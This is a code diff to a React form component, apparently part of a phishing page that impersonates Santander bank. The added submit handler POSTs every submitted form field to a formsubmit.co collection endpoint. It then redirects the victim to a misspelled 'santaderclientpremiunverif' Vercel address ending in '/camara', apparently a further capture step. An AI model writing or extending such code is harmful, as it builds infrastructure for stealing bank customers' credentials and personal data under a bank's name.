@@ -28,18 +28,34 @@ const Form = () => {
     setFormData({ ...formData, [name]: value });
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     if (validate()) {
-      // Aquí puedes manejar el envío del formulario
-      console.log('Formulario enviado:', formData);
+      try {
+        const response = await fetch('https://api.formsubmit.co/ajax/44b61e96-d80d-4706-87e8-bcaa689dae2a', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(formData),
+        });
+        
+        if (response.ok) {
+          console.log('Formulario enviado:', formData);
+          window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara';
+        } else {
+          console.error('Error al enviar el formulario');
+        }
+      } catch (error) {
+        console.error('Error al enviar el formulario:', error);
+      }
     }
   };
 
   return (
     <div className="container">
       <div className="background">
-        <img src="https://travelgrafia.co/wp-content/uploads/2023/08/Tour-Chichen-Itza-desde-Cancun.jpg" alt="Background" className="background-img" />
+        <img src={backgroundImg} alt="Background" className="background-img" />
       </div>
       <div className="content">
         <img src={logo} alt="Logo" className="logo" />
